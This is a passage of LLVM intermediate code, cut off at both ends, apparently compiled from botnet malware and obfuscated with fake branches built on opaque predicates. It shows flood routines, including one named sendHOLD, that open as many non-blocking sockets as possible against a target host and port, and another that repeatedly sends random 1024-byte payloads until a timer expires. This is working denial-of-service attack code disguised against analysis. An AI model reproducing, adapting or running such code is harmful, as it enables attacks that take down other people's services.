  %249 = load i32, i32* %248, align 8
  %250 = call i32 @close(i32 %249)
  %251 = load i32, i32* %16, align 4
  %252 = sext i32 %251 to i64
  %253 = getelementptr inbounds %struct.state_t, %struct.state_t* %54, i64 %252
  %254 = getelementptr inbounds %struct.state_t, %struct.state_t* %253, i32 0, i32 1
  store i8 0, i8* %254, align 4
  br label %255

; <label>:255:                                    ; preds = %244, %241
  br label %256

; <label>:256:                                    ; preds = %255, %240
  br label %299

; <label>:257:                                    ; preds = %89
  %258 = load i32, i32* @x.75
  %259 = load i32, i32* @y.76
  %260 = sub i32 %258, 1
  %261 = mul i32 %258, %260
  %262 = urem i32 %261, 2
  %263 = icmp eq i32 %262, 0
  %264 = icmp slt i32 %259, 10
  %265 = or i1 %263, %264
  br i1 %265, label %originalBB17, label %originalBB17alteredBB

originalBB17:                                     ; preds = %originalBB17alteredBB, %257
  %266 = load i8*, i8** %24, align 8
  call void @makeRandomStr(i8* %266, i32 1024)
  %267 = load i32, i32* %16, align 4
  %268 = sext i32 %267 to i64
  %269 = getelementptr inbounds %struct.state_t, %struct.state_t* %54, i64 %268
  %270 = getelementptr inbounds %struct.state_t, %struct.state_t* %269, i32 0, i32 0
  %271 = load i32, i32* %270, align 8
  %272 = load i8*, i8** %24, align 8
  %273 = call i64 @send(i32 %271, i8* %272, i64 1024, i32 16384)
  %274 = icmp eq i64 %273, -1
  %275 = load i32, i32* @x.75
  %276 = load i32, i32* @y.76
  %277 = sub i32 %275, 1
  %278 = mul i32 %275, %277
  %279 = urem i32 %278, 2
  %280 = icmp eq i32 %279, 0
  %281 = icmp slt i32 %276, 10
  %282 = or i1 %280, %281
  br i1 %282, label %originalBBpart219, label %originalBB17alteredBB

originalBBpart219:                                ; preds = %originalBB17
  br i1 %274, label %283, label %298

; <label>:283:                                    ; preds = %originalBBpart219
  %284 = call i32* @__errno_location() #13
  %285 = load i32, i32* %284, align 4
  %286 = icmp ne i32 %285, 11
  br i1 %286, label %287, label %298

; <label>:287:                                    ; preds = %283
  %288 = load i32, i32* %16, align 4
  %289 = sext i32 %288 to i64
  %290 = getelementptr inbounds %struct.state_t, %struct.state_t* %54, i64 %289
  %291 = getelementptr inbounds %struct.state_t, %struct.state_t* %290, i32 0, i32 0
  %292 = load i32, i32* %291, align 8
  %293 = call i32 @close(i32 %292)
  %294 = load i32, i32* %16, align 4
  %295 = sext i32 %294 to i64
  %296 = getelementptr inbounds %struct.state_t, %struct.state_t* %54, i64 %295
  %297 = getelementptr inbounds %struct.state_t, %struct.state_t* %296, i32 0, i32 1
  store i8 0, i8* %297, align 4
  br label %298

; <label>:298:                                    ; preds = %287, %283, %originalBBpart219
  br label %299

; <label>:299:                                    ; preds = %298, %256, %139, %89
  %300 = load i32, i32* @x.75
  %301 = load i32, i32* @y.76
  %302 = sub i32 %300, 1
  %303 = mul i32 %300, %302
  %304 = urem i32 %303, 2
  %305 = icmp eq i32 %304, 0
  %306 = icmp slt i32 %301, 10
  %307 = or i1 %305, %306
  br i1 %307, label %originalBB21, label %originalBB21alteredBB

originalBB21:                                     ; preds = %originalBB21alteredBB, %299
  %308 = load i32, i32* @x.75
  %309 = load i32, i32* @y.76
  %310 = sub i32 %308, 1
  %311 = mul i32 %308, %310
  %312 = urem i32 %311, 2
  %313 = icmp eq i32 %312, 0
  %314 = icmp slt i32 %309, 10
  %315 = or i1 %313, %314
  br i1 %315, label %originalBBpart223, label %originalBB21alteredBB

originalBBpart223:                                ; preds = %originalBB21
  br label %316

; <label>:316:                                    ; preds = %originalBBpart223
  %317 = load i32, i32* @x.75
  %318 = load i32, i32* @y.76
  %319 = sub i32 %317, 1
  %320 = mul i32 %317, %319
  %321 = urem i32 %320, 2
  %322 = icmp eq i32 %321, 0
  %323 = icmp slt i32 %318, 10
  %324 = or i1 %322, %323
  br i1 %324, label %originalBB25, label %originalBB25alteredBB

originalBB25:                                     ; preds = %originalBB25alteredBB, %316
  %325 = load i32, i32* %16, align 4
  %326 = add nsw i32 %325, 1
  store i32 %326, i32* %16, align 4
  %327 = load i32, i32* @x.75
  %328 = load i32, i32* @y.76
  %329 = sub i32 %327, 1
  %330 = mul i32 %327, %329
  %331 = urem i32 %330, 2
  %332 = icmp eq i32 %331, 0
  %333 = icmp slt i32 %328, 10
  %334 = or i1 %332, %333
  br i1 %334, label %originalBBpart237, label %originalBB25alteredBB

originalBBpart237:                                ; preds = %originalBB25
  br label %85

; <label>:335:                                    ; preds = %85
  %336 = load i32, i32* @x.75
  %337 = load i32, i32* @y.76
  %338 = sub i32 %336, 1
  %339 = mul i32 %336, %338
  %340 = urem i32 %339, 2
  %341 = icmp eq i32 %340, 0
  %342 = icmp slt i32 %337, 10
  %343 = or i1 %341, %342
  br i1 %343, label %originalBB39, label %originalBB39alteredBB

originalBB39:                                     ; preds = %originalBB39alteredBB, %335
  %344 = load i32, i32* @x.75
  %345 = load i32, i32* @y.76
  %346 = sub i32 %344, 1
  %347 = mul i32 %344, %346
  %348 = urem i32 %347, 2
  %349 = icmp eq i32 %348, 0
  %350 = icmp slt i32 %345, 10
  %351 = or i1 %349, %350
  br i1 %351, label %originalBBpart241, label %originalBB39alteredBB

originalBBpart241:                                ; preds = %originalBB39
  br label %64

; <label>:352:                                    ; preds = %originalBBpart27
  %353 = load i8*, i8** %18, align 8
  call void @llvm.stackrestore(i8* %353)
  br label %354

; <label>:354:                                    ; preds = %352, %47
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %3
  %355 = alloca i8*, align 8
  %356 = alloca i32, align 4
  %357 = alloca i32, align 4
  %358 = alloca i32, align 4
  %359 = alloca i32, align 4
  %360 = alloca %struct.sockaddr_in, align 4
  %361 = alloca i8*, align 8
  %362 = alloca %struct.__sigset_t, align 8
  %363 = alloca %struct.timeval, align 8
  %364 = alloca i32, align 4
  %365 = alloca i32, align 4
  %366 = alloca i32, align 4
  %367 = alloca i8*, align 8
  %368 = alloca i32, align 4
  %369 = alloca i32, align 4
  %370 = alloca i32, align 4
  store i8* %0, i8** %355, align 8
  store i32 %1, i32* %356, align 4
  store i32 %2, i32* %357, align 4
  %371 = call i32 @getdtablesize() #2
  %_ = sub i32 %371, 2
  %gen = mul i32 %_, 2
  %_1 = sub i32 %371, 2
  %gen2 = mul i32 %_1, 2
  %_3 = sub i32 0, %371
  %gen4 = add i32 %_3, 2
  %372 = sdiv i32 %371, 2
  store i32 %372, i32* %358, align 4
  %373 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %360, i32 0, i32 0
  store i16 2, i16* %373, align 4
  %374 = load i32, i32* %356, align 4
  %375 = trunc i32 %374 to i16
  %376 = call zeroext i16 @htons(i16 zeroext %375) #13
  %377 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %360, i32 0, i32 1
  store i16 %376, i16* %377, align 2
  %378 = load i8*, i8** %355, align 8
  %379 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %360, i32 0, i32 2
  %380 = call i32 @getHost(i8* %378, %struct.in_addr* %379)
  %381 = icmp ne i32 %380, 0
  br label %originalBB

originalBB5alteredBB:                             ; preds = %originalBB5, %64
  %382 = load i32, i32* %25, align 4
  %383 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %384 = icmp sgt i32 %382, %383
  br label %originalBB5

originalBB9alteredBB:                             ; preds = %originalBB9, %141
  %385 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %19, i32 0, i32 0
  %386 = getelementptr inbounds [16 x i64], [16 x i64]* %385, i64 0, i64 0
  %387 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %386) #2, !srcloc !6
  %388 = extractvalue { i64, i64* } %387, 0
  %389 = extractvalue { i64, i64* } %387, 1
  %390 = trunc i64 %388 to i32
  store i32 %390, i32* %26, align 4
  %391 = ptrtoint i64* %389 to i64
  %392 = trunc i64 %391 to i32
  store i32 %392, i32* %27, align 4
  br label %originalBB9

originalBB13alteredBB:                            ; preds = %originalBB13, %198
  store i32 4, i32* %21, align 4
  %393 = load i32, i32* %16, align 4
  %394 = sext i32 %393 to i64
  %395 = getelementptr inbounds %struct.state_t, %struct.state_t* %54, i64 %394
  %396 = getelementptr inbounds %struct.state_t, %struct.state_t* %395, i32 0, i32 0
  %397 = load i32, i32* %396, align 8
  %398 = bitcast i32* %22 to i8*
  %399 = call i32 @getsockopt(i32 %397, i32 1, i32 4, i8* %398, i32* %21) #2
  %400 = load i32, i32* %22, align 4
  %401 = icmp ne i32 %400, 0
  br label %originalBB13

originalBB17alteredBB:                            ; preds = %originalBB17, %257
  %402 = load i8*, i8** %24, align 8
  call void @makeRandomStr(i8* %402, i32 1024)
  %403 = load i32, i32* %16, align 4
  %404 = sext i32 %403 to i64
  %405 = getelementptr inbounds %struct.state_t, %struct.state_t* %54, i64 %404
  %406 = getelementptr inbounds %struct.state_t, %struct.state_t* %405, i32 0, i32 0
  %407 = load i32, i32* %406, align 8
  %408 = load i8*, i8** %24, align 8
  %409 = call i64 @send(i32 %407, i8* %408, i64 1024, i32 16384)
  %410 = icmp eq i64 %409, -1
  br label %originalBB17

originalBB21alteredBB:                            ; preds = %originalBB21, %299
  br label %originalBB21

originalBB25alteredBB:                            ; preds = %originalBB25, %316
  %411 = load i32, i32* %16, align 4
  %_26 = sub i32 0, %411
  %gen27 = add i32 %_26, 1
  %_28 = sub i32 0, %411
  %gen29 = add i32 %_28, 1
  %_30 = sub i32 %411, 1
  %gen31 = mul i32 %_30, 1
  %_32 = shl i32 %411, 1
  %_33 = shl i32 %411, 1
  %_34 = sub i32 0, %411
  %gen35 = add i32 %_34, 1
  %412 = add nsw i32 %411, 1
  store i32 %412, i32* %16, align 4
  br label %originalBB25

originalBB39alteredBB:                            ; preds = %originalBB39, %335
  br label %originalBB39
}

; Function Attrs: noinline nounwind uwtable
define void @sendHOLD(i8*, i32, i32) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca %struct.sockaddr_in, align 4
  %10 = alloca i8*, align 8
  %11 = alloca %struct.__sigset_t, align 8
  %12 = alloca %struct.timeval, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i8*, align 8
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  %22 = call i32 @getdtablesize() #2
  %23 = sdiv i32 %22, 2
  store i32 %23, i32* %7, align 4
  %24 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 0
  store i16 2, i16* %24, align 4
  %25 = load i32, i32* %5, align 4
  %26 = trunc i32 %25 to i16
  %27 = call zeroext i16 @htons(i16 zeroext %26) #13
  %28 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 1
  store i16 %27, i16* %28, align 2
  %29 = load i8*, i8** %4, align 8
  %30 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 2
  %31 = call i32 @getHost(i8* %29, %struct.in_addr* %30)
  %32 = icmp ne i32 %31, 0
  br i1 %32, label %33, label %34

; <label>:33:                                     ; preds = %3
  br label %416

; <label>:34:                                     ; preds = %3
  %35 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 3
  %36 = getelementptr inbounds [8 x i8], [8 x i8]* %35, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %36, i8 0, i64 8, i32 4, i1 false)
  %37 = load i32, i32* %7, align 4
  %38 = zext i32 %37 to i64
  %39 = call i8* @llvm.stacksave()
  store i8* %39, i8** %10, align 8
  %40 = alloca %struct.state_t, i64 %38, align 16
  %41 = bitcast %struct.state_t* %40 to i8*
  %42 = load i32, i32* %7, align 4
  %43 = sext i32 %42 to i64
  %44 = mul i64 %43, 5
  call void @llvm.memset.p0i8.i64(i8* %41, i8 0, i64 %44, i32 16, i1 false)
  %45 = call noalias i8* @malloc(i64 1024) #2
  store i8* %45, i8** %16, align 8
  %46 = load i8*, i8** %16, align 8
  call void @llvm.memset.p0i8.i64(i8* %46, i8 0, i64 1024, i32 1, i1 false)
  %47 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %48 = load i32, i32* %6, align 4
  %49 = add nsw i32 %47, %48
  store i32 %49, i32* %17, align 4
  br label %50

; <label>:50:                                     ; preds = %originalBBpart2100, %34
  %51 = load i32, i32* @x.77
  %52 = load i32, i32* @y.78
  %53 = sub i32 %51, 1
  %54 = mul i32 %51, %53
  %55 = urem i32 %54, 2
  %56 = icmp eq i32 %55, 0
  %57 = icmp slt i32 %52, 10
  %58 = or i1 %56, %57
  br i1 %58, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %50
  %59 = load i32, i32* %17, align 4
  %60 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %61 = icmp sgt i32 %59, %60
  %62 = load i32, i32* @x.77
  %63 = load i32, i32* @y.78
  %64 = sub i32 %62, 1
  %65 = mul i32 %62, %64
  %66 = urem i32 %65, 2
  %67 = icmp eq i32 %66, 0
  %68 = icmp slt i32 %63, 10
  %69 = or i1 %67, %68
  br i1 %69, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %61, label %70, label %398

; <label>:70:                                     ; preds = %originalBBpart2
  store i32 0, i32* %8, align 4
  br label %71

; <label>:71:                                     ; preds = %378, %70
  %72 = load i32, i32* %8, align 4
  %73 = load i32, i32* %7, align 4
  %74 = icmp slt i32 %72, %73
  br i1 %74, label %75, label %381

; <label>:75:                                     ; preds = %71
  %76 = load i32, i32* @x.77
  %77 = load i32, i32* @y.78
  %78 = sub i32 %76, 1
  %79 = mul i32 %76, %78
  %80 = urem i32 %79, 2
  %81 = icmp eq i32 %80, 0
  %82 = icmp slt i32 %77, 10
  %83 = or i1 %81, %82
  br i1 %83, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %75
  %84 = load i32, i32* %8, align 4
  %85 = sext i32 %84 to i64
  %86 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %85
  %87 = getelementptr inbounds %struct.state_t, %struct.state_t* %86, i32 0, i32 1
  %88 = load i8, i8* %87, align 4
  %89 = zext i8 %88 to i32
  %90 = load i32, i32* @x.77
  %91 = load i32, i32* @y.78
  %92 = sub i32 %90, 1
  %93 = mul i32 %90, %92
  %94 = urem i32 %93, 2
  %95 = icmp eq i32 %94, 0
  %96 = icmp slt i32 %91, 10
  %97 = or i1 %95, %96
  br i1 %97, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  switch i32 %89, label %361 [
    i32 0, label %98
    i32 1, label %142
    i32 2, label %291
  ]

; <label>:98:                                     ; preds = %originalBBpart24
  %99 = call i32 @socket(i32 2, i32 1, i32 0) #2
  %100 = load i32, i32* %8, align 4
  %101 = sext i32 %100 to i64
  %102 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %101
  %103 = getelementptr inbounds %struct.state_t, %struct.state_t* %102, i32 0, i32 0
  store i32 %99, i32* %103, align 8
  %104 = load i32, i32* %8, align 4
  %105 = sext i32 %104 to i64
  %106 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %105
  %107 = getelementptr inbounds %struct.state_t, %struct.state_t* %106, i32 0, i32 0
  %108 = load i32, i32* %107, align 8
  %109 = load i32, i32* %8, align 4
  %110 = sext i32 %109 to i64
  %111 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %110
  %112 = getelementptr inbounds %struct.state_t, %struct.state_t* %111, i32 0, i32 0
  %113 = load i32, i32* %112, align 8
  %114 = call i32 (i32, i32, ...) @fcntl(i32 %113, i32 3, i8* null)
  %115 = or i32 %114, 2048
  %116 = call i32 (i32, i32, ...) @fcntl(i32 %108, i32 4, i32 %115)
  %117 = load i32, i32* %8, align 4
  %118 = sext i32 %117 to i64
  %119 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %118
  %120 = getelementptr inbounds %struct.state_t, %struct.state_t* %119, i32 0, i32 0
  %121 = load i32, i32* %120, align 8
  %122 = bitcast %struct.sockaddr_in* %9 to %struct.sockaddr*
  %123 = call i32 @connect(i32 %121, %struct.sockaddr* %122, i32 16)
  %124 = icmp ne i32 %123, -1
  br i1 %124, label %129, label %125

; <label>:125:                                    ; preds = %98
  %126 = call i32* @__errno_location() #13
  %127 = load i32, i32* %126, align 4
  %128 = icmp ne i32 %127, 115
  br i1 %128, label %129, label %136

; <label>:129:                                    ; preds = %125, %98
  %130 = load i32, i32* %8, align 4
  %131 = sext i32 %130 to i64
  %132 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %131
  %133 = getelementptr inbounds %struct.state_t, %struct.state_t* %132, i32 0, i32 0
  %134 = load i32, i32* %133, align 8
  %135 = call i32 @close(i32 %134)
  br label %141

; <label>:136:                                    ; preds = %125
  %137 = load i32, i32* %8, align 4
  %138 = sext i32 %137 to i64
  %139 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %138
  %140 = getelementptr inbounds %struct.state_t, %struct.state_t* %139, i32 0, i32 1
  store i8 1, i8* %140, align 4
  br label %141

; <label>:141:                                    ; preds = %136, %129
  br label %361

; <label>:142:                                    ; preds = %originalBBpart24
  br label %143

; <label>:143:                                    ; preds = %142
  %144 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %145 = getelementptr inbounds [16 x i64], [16 x i64]* %144, i64 0, i64 0
  %146 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %145) #2, !srcloc !7
  %147 = extractvalue { i64, i64* } %146, 0
  %148 = extractvalue { i64, i64* } %146, 1
  %149 = trunc i64 %147 to i32
  store i32 %149, i32* %18, align 4
  %150 = ptrtoint i64* %148 to i64
  %151 = trunc i64 %150 to i32
  store i32 %151, i32* %19, align 4
  br label %152

; <label>:152:                                    ; preds = %143
  %153 = load i32, i32* @x.77
  %154 = load i32, i32* @y.78
  %155 = sub i32 %153, 1
  %156 = mul i32 %153, %155
  %157 = urem i32 %156, 2
  %158 = icmp eq i32 %157, 0
  %159 = icmp slt i32 %154, 10
  %160 = or i1 %158, %159
  br i1 %160, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %152
  %161 = load i32, i32* @x.77
  %162 = load i32, i32* @y.78
  %163 = sub i32 %161, 1
  %164 = mul i32 %161, %163
  %165 = urem i32 %164, 2
  %166 = icmp eq i32 %165, 0
  %167 = icmp slt i32 %162, 10
  %168 = or i1 %166, %167
  br i1 %168, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %169

; <label>:169:                                    ; preds = %originalBBpart28
  %170 = load i32, i32* @x.77
  %171 = load i32, i32* @y.78
  %172 = sub i32 %170, 1
  %173 = mul i32 %170, %172
  %174 = urem i32 %173, 2
  %175 = icmp eq i32 %174, 0
  %176 = icmp slt i32 %171, 10
  %177 = or i1 %175, %176
  br i1 %177, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %169
  %178 = load i32, i32* %8, align 4
  %179 = sext i32 %178 to i64
  %180 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %179
  %181 = getelementptr inbounds %struct.state_t, %struct.state_t* %180, i32 0, i32 0
  %182 = load i32, i32* %181, align 8
  %183 = srem i32 %182, 64
  %184 = zext i32 %183 to i64
  %185 = shl i64 1, %184
  %186 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %187 = load i32, i32* %8, align 4
  %188 = sext i32 %187 to i64
  %189 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %188
  %190 = getelementptr inbounds %struct.state_t, %struct.state_t* %189, i32 0, i32 0
  %191 = load i32, i32* %190, align 8
  %192 = sdiv i32 %191, 64
  %193 = sext i32 %192 to i64
  %194 = getelementptr inbounds [16 x i64], [16 x i64]* %186, i64 0, i64 %193
  %195 = load i64, i64* %194, align 8
  %196 = or i64 %195, %185
  store i64 %196, i64* %194, align 8
  %197 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 0
  store i64 0, i64* %197, align 8
  %198 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 1
  store i64 10000, i64* %198, align 8
  %199 = load i32, i32* %8, align 4
  %200 = sext i32 %199 to i64
  %201 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %200
  %202 = getelementptr inbounds %struct.state_t, %struct.state_t* %201, i32 0, i32 0
  %203 = load i32, i32* %202, align 8
  %204 = add nsw i32 %203, 1
  %205 = call i32 @select(i32 %204, %struct.__sigset_t* null, %struct.__sigset_t* %11, %struct.__sigset_t* null, %struct.timeval* %12)
  store i32 %205, i32* %15, align 4
  %206 = load i32, i32* %15, align 4
  %207 = icmp eq i32 %206, 1
  %208 = load i32, i32* @x.77
  %209 = load i32, i32* @y.78
  %210 = sub i32 %208, 1
  %211 = mul i32 %208, %210
  %212 = urem i32 %211, 2
  %213 = icmp eq i32 %212, 0
  %214 = icmp slt i32 %209, 10
  %215 = or i1 %213, %214
  br i1 %215, label %originalBBpart250, label %originalBB10alteredBB

originalBBpart250:                                ; preds = %originalBB10
  br i1 %207, label %216, label %259

; <label>:216:                                    ; preds = %originalBBpart250
  store i32 4, i32* %13, align 4
  %217 = load i32, i32* %8, align 4
  %218 = sext i32 %217 to i64
  %219 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %218
  %220 = getelementptr inbounds %struct.state_t, %struct.state_t* %219, i32 0, i32 0
  %221 = load i32, i32* %220, align 8
  %222 = bitcast i32* %14 to i8*
  %223 = call i32 @getsockopt(i32 %221, i32 1, i32 4, i8* %222, i32* %13) #2
  %224 = load i32, i32* %14, align 4
  %225 = icmp ne i32 %224, 0
  br i1 %225, label %226, label %237

; <label>:226:                                    ; preds = %216
  %227 = load i32, i32* %8, align 4
  %228 = sext i32 %227 to i64
  %229 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %228
  %230 = getelementptr inbounds %struct.state_t, %struct.state_t* %229, i32 0, i32 0
  %231 = load i32, i32* %230, align 8
  %232 = call i32 @close(i32 %231)
  %233 = load i32, i32* %8, align 4
  %234 = sext i32 %233 to i64
  %235 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %234
  %236 = getelementptr inbounds %struct.state_t, %struct.state_t* %235, i32 0, i32 1
  store i8 0, i8* %236, align 4
  br label %242

; <label>:237:                                    ; preds = %216
  %238 = load i32, i32* %8, align 4
  %239 = sext i32 %238 to i64
  %240 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %239
  %241 = getelementptr inbounds %struct.state_t, %struct.state_t* %240, i32 0, i32 1
  store i8 2, i8* %241, align 4
  br label %242

; <label>:242:                                    ; preds = %237, %226
  %243 = load i32, i32* @x.77
  %244 = load i32, i32* @y.78
  %245 = sub i32 %243, 1
  %246 = mul i32 %243, %245
  %247 = urem i32 %246, 2
  %248 = icmp eq i32 %247, 0
  %249 = icmp slt i32 %244, 10
  %250 = or i1 %248, %249
  br i1 %250, label %originalBB52, label %originalBB52alteredBB

originalBB52:                                     ; preds = %originalBB52alteredBB, %242
  %251 = load i32, i32* @x.77
  %252 = load i32, i32* @y.78
  %253 = sub i32 %251, 1
  %254 = mul i32 %251, %253
  %255 = urem i32 %254, 2
  %256 = icmp eq i32 %255, 0
  %257 = icmp slt i32 %252, 10
  %258 = or i1 %256, %257
  br i1 %258, label %originalBBpart254, label %originalBB52alteredBB

originalBBpart254:                                ; preds = %originalBB52
  br label %274

; <label>:259:                                    ; preds = %originalBBpart250
  %260 = load i32, i32* %15, align 4
  %261 = icmp eq i32 %260, -1
  br i1 %261, label %262, label %273

; <label>:262:                                    ; preds = %259
  %263 = load i32, i32* %8, align 4
  %264 = sext i32 %263 to i64
  %265 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %264
  %266 = getelementptr inbounds %struct.state_t, %struct.state_t* %265, i32 0, i32 0
  %267 = load i32, i32* %266, align 8
  %268 = call i32 @close(i32 %267)
  %269 = load i32, i32* %8, align 4
  %270 = sext i32 %269 to i64
  %271 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %270
  %272 = getelementptr inbounds %struct.state_t, %struct.state_t* %271, i32 0, i32 1
  store i8 0, i8* %272, align 4
  br label %273

; <label>:273:                                    ; preds = %262, %259
  br label %274

; <label>:274:                                    ; preds = %273, %originalBBpart254
  %275 = load i32, i32* @x.77
  %276 = load i32, i32* @y.78
  %277 = sub i32 %275, 1
  %278 = mul i32 %275, %277
  %279 = urem i32 %278, 2
  %280 = icmp eq i32 %279, 0
  %281 = icmp slt i32 %276, 10
  %282 = or i1 %280, %281
  br i1 %282, label %originalBB56, label %originalBB56alteredBB

originalBB56:                                     ; preds = %originalBB56alteredBB, %274
  %283 = load i32, i32* @x.77
  %284 = load i32, i32* @y.78
  %285 = sub i32 %283, 1
  %286 = mul i32 %283, %285
  %287 = urem i32 %286, 2
  %288 = icmp eq i32 %287, 0
  %289 = icmp slt i32 %284, 10
  %290 = or i1 %288, %289
  br i1 %290, label %originalBBpart258, label %originalBB56alteredBB

originalBBpart258:                                ; preds = %originalBB56
  br label %361

; <label>:291:                                    ; preds = %originalBBpart24
  br label %292

; <label>:292:                                    ; preds = %291
  %293 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %294 = getelementptr inbounds [16 x i64], [16 x i64]* %293, i64 0, i64 0
  %295 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %294) #2, !srcloc !8
  %296 = extractvalue { i64, i64* } %295, 0
  %297 = extractvalue { i64, i64* } %295, 1
  %298 = trunc i64 %296 to i32
  store i32 %298, i32* %20, align 4
  %299 = ptrtoint i64* %297 to i64
  %300 = trunc i64 %299 to i32
  store i32 %300, i32* %21, align 4
  br label %301

; <label>:301:                                    ; preds = %292
  br label %302

; <label>:302:                                    ; preds = %301
  %303 = load i32, i32* @x.77
  %304 = load i32, i32* @y.78
  %305 = sub i32 %303, 1
  %306 = mul i32 %303, %305
  %307 = urem i32 %306, 2
  %308 = icmp eq i32 %307, 0
  %309 = icmp slt i32 %304, 10
  %310 = or i1 %308, %309
  br i1 %310, label %originalBB60, label %originalBB60alteredBB

originalBB60:                                     ; preds = %originalBB60alteredBB, %302
  %311 = load i32, i32* %8, align 4
  %312 = sext i32 %311 to i64
  %313 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %312
  %314 = getelementptr inbounds %struct.state_t, %struct.state_t* %313, i32 0, i32 0
  %315 = load i32, i32* %314, align 8
  %316 = srem i32 %315, 64
  %317 = zext i32 %316 to i64
  %318 = shl i64 1, %317
  %319 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %320 = load i32, i32* %8, align 4
  %321 = sext i32 %320 to i64
  %322 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %321
  %323 = getelementptr inbounds %struct.state_t, %struct.state_t* %322, i32 0, i32 0
  %324 = load i32, i32* %323, align 8
  %325 = sdiv i32 %324, 64
  %326 = sext i32 %325 to i64
  %327 = getelementptr inbounds [16 x i64], [16 x i64]* %319, i64 0, i64 %326
  %328 = load i64, i64* %327, align 8
  %329 = or i64 %328, %318
  store i64 %329, i64* %327, align 8
  %330 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 0
  store i64 0, i64* %330, align 8
  %331 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 1
  store i64 10000, i64* %331, align 8
  %332 = load i32, i32* %8, align 4
  %333 = sext i32 %332 to i64
  %334 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %333
  %335 = getelementptr inbounds %struct.state_t, %struct.state_t* %334, i32 0, i32 0
  %336 = load i32, i32* %335, align 8
  %337 = add nsw i32 %336, 1
  %338 = call i32 @select(i32 %337, %struct.__sigset_t* null, %struct.__sigset_t* null, %struct.__sigset_t* %11, %struct.timeval* %12)
  store i32 %338, i32* %15, align 4
  %339 = load i32, i32* %15, align 4
  %340 = icmp ne i32 %339, 0
  %341 = load i32, i32* @x.77
  %342 = load i32, i32* @y.78
  %343 = sub i32 %341, 1
  %344 = mul i32 %341, %343
  %345 = urem i32 %344, 2
  %346 = icmp eq i32 %345, 0
  %347 = icmp slt i32 %342, 10
  %348 = or i1 %346, %347
  br i1 %348, label %originalBBpart292, label %originalBB60alteredBB

originalBBpart292:                                ; preds = %originalBB60
  br i1 %340, label %349, label %360

; <label>:349:                                    ; preds = %originalBBpart292
  %350 = load i32, i32* %8, align 4
  %351 = sext i32 %350 to i64
  %352 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %351
  %353 = getelementptr inbounds %struct.state_t, %struct.state_t* %352, i32 0, i32 0
  %354 = load i32, i32* %353, align 8
